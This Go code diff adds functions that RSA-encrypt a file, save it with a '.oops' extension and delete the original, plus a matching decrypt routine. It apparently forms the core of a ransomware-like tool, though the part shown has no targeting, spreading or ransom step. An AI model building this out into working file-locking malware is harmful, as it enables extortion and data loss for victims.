@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	"strings"
 )
 
 const (
@@ -136,4 +137,65 @@ func LoadPrivateKey(filename string) (*rsa.PrivateKey, error) {
 	}
 
 	return privateKey, nil
+}
+
+func EncryptFile(filename string, publicKey *rsa.PublicKey) error {
+	fmt.Printf("🔐 Encrypting file=%s\n", filename)
+
+	// Read the file
+	content, err := ioutil.ReadFile(filename)
+	if err != nil {
+		return fmt.Errorf("error reading file: %v", err)
+	}
+
+	// Encrypt the content
+	encryptedContent, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, content)
+	if err != nil {
+		return fmt.Errorf("error encrypting content: %v", err)
+	}
+
+	// Write the encrypted content back into a new file with .oops extension
+	err = ioutil.WriteFile(filename+".oops", encryptedContent, 0644)
+	if err != nil {
+		return fmt.Errorf("error writing encrypted content: %v", err)
+	}
+
+	// Delete the original file
+	err = os.Remove(filename)
+	if err != nil {
+		return fmt.Errorf("error deleting original file: %v", err)
+	}
+
+	return nil
+}
+
+func DecryptFile(filename string, privateKey *rsa.PrivateKey) error {
+	fmt.Printf("🔓 Decrypting file=%s\n", filename)
+
+	// Read the encrypted file
+	content, err := ioutil.ReadFile(filename)
+	if err != nil {
+		return fmt.Errorf("error reading encrypted file: %v", err)
+	}
+
+	// Decrypt the content
+	decryptedContent, err := rsa.DecryptPKCS1v15(rand.Reader, privateKey, content)
+	if err != nil {
+		return fmt.Errorf("error decrypting content: %v", err)
+	}
+
+	// Write the decrypted content back into a new file, removing the .oops extension
+	newFilename := strings.TrimSuffix(filename, ".oops")
+	err = ioutil.WriteFile(newFilename, decryptedContent, 0644)
+	if err != nil {
+		return fmt.Errorf("error writing decrypted content: %v", err)
+	}
+
+	// Delete the encrypted file
+	err = os.Remove(filename)
+	if err != nil {
+		return fmt.Errorf("error deleting encrypted file: %v", err)
+	}
+
+	return nil
 }
